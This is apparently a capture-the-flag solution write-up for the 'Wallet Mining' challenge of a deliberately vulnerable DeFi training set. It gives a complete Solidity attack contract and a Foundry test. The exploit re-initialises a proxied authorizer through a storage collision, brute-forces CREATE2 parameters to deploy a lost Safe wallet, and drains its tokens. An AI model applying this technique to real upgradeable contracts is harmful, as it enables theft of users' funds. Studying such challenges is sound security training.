# 13. Wallet Mining

- This challenge featured a Transparent Proxy which had storage collision. We used this collision to initialise the implementation once again and give our attacking contract access.
- We had to reverse-engineer an address for a deployed wallet. We had to find a correct nonce and initialisation parameters for the deployment in order to find the correct `salt` for the contract.
- Finally we had to build a transaction to transfer the tokens to the user and sign it with the user’s private key.

## Solution

```solidity
contract AttackWalletDeployer {
    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
    uint256 constant NONCE_RANGE = 20;

    constructor(
        address authorizerProxy,
        WalletDeployer walletDeployer,
        address user,
        address ward,
        bytes memory signatures
    ) {
        authorize(authorizerProxy);

        (bytes memory initializer, uint256 nonce) =
            findLostParams(walletDeployer.cpy(), user, address(walletDeployer.cook()));

        walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, nonce);

        DamnValuableToken token = DamnValuableToken(walletDeployer.gem());
        token.transfer(ward, token.balanceOf(address(this)));

        Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
            address(token), // to
            0, // value
            abi.encodeCall(token.transfer, (user, DEPOSIT_TOKEN_AMOUNT)), // data
            Enum.Operation.Call, // operation (Call)
            50000, // safeTxGas
            0, // baseGas
            0, // gasPrice
            address(0), // gasToken
            payable(address(0)), // refundReceiver
            signatures // signatures
        );
    }

    function authorize(address authorizerProxy) internal {
        address[] memory wards = new address[](1);
        wards[0] = address(this);
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;

        (bool success,) = authorizerProxy.call(abi.encodeCall(AuthorizerUpgradeable.init, (wards, aims)));
        require(success, "Failed to init authorizer with attacker ward");
    }

    function findLostParams(address _singleton, address _user, address _factory)
        internal
        pure
        returns (bytes memory initializer, uint256 nonce)
    {
        bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(_singleton)));

        // Standard Safe setup for the user
        address[] memory owners = new address[](1);
        owners[0] = _user;
        initializer =
            abi.encodeCall(Safe.setup, (owners, 1, address(0), "", address(0), address(0), 0, payable(address(0))));

        for (uint256 j = 0; j < NONCE_RANGE; j++) {
            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), j));

            address derived = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), _factory, salt, keccak256(deploymentData)))))
            );

            if (derived == USER_DEPOSIT_ADDRESS) {
                return (initializer, j);
            }
        }

        revert("Lost params not found");
    }
}

// TEST

    function test_walletMining() public checkSolvedByPlayer {
        bytes32 DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                bytes32(0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218), // Safe domain type hash
                block.chainid, // Current chain ID
                USER_DEPOSIT_ADDRESS // Safe contract address
            )
        );
        bytes memory txHashData = abi.encodePacked(
            bytes1(0x19), // EIP-191 prefix
            bytes1(0x01), // EIP-712 version
            DOMAIN_SEPARATOR,
            keccak256(
                abi.encode(
                    bytes32(0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8), // Safe domain type hash
                    address(token),
                    0,
                    keccak256(abi.encodeCall(token.transfer, (user, 20_000_000e18))),
                    Enum.Operation.Call,
                    50000,
                    0,
                    0,
                    address(0),
                    payable(0),
                    0
                )
            )
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, keccak256(txHashData));
        bytes memory signatures = abi.encodePacked(r, s, v);

        new AttackWalletDeployer(address(authorizer), walletDeployer, user, ward, signatures);
    }
```
